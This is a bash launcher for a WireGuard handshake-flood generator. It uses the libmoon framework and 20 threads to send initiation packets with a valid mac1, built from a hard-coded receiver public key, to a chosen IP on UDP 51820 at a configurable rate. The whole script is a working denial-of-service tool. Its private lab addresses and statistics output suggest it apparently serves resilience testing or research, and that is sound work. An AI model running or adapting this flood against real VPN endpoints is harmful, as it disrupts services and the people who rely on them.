#!/bin/bash

# sudo script.sh <ipSrc> <ipDst> <attackRate> <duration>
# e.g.
# sudo bash wgFlood.sh 172.31.116.132 172.31.116.137 1000 10

# cd to directory of script
scriptDir=$(dirname -- "$(readlink -f -- "$BASH_SOURCE")")
cd "$scriptDir"

# prepare Flood Generator framework
source ../prepFloodGenerator.sh

############## Flood Configuration ##############

ipSrc=$1
ipDst=$2
attackRate=$3
seconds=$4

flows=${7:-1} #default value 1

# more fixed configuration values (adjust if needed)
ethSrc="3c:fd:fe:9e:8e:39"
udpSrc=51820

ethDst="b0:aa:77:2f:ab:1a"
udpDst=51820


############## Flood Start ##############

# creates initiation packets with valid mac1
# (requires receiver's public key)

$libmoonBuild/libmoon wgFlood.lua \
    --seconds $seconds --threads 20 --rate $attackRate \
    --pubkey "800nxsP002z/3j08CklD2752VlFYj3I9A+c7mNVIzhM=" \
    --flows $flows \
    --ethSrc $ethSrc --ip4Src $ipSrc --udpSrc $udpSrc \
    --ethDst $ethDst --ip4Dst $ipDst --udpDst $udpDst \
    --startConfirmation \
    --outputDevStats stats.txt \
    0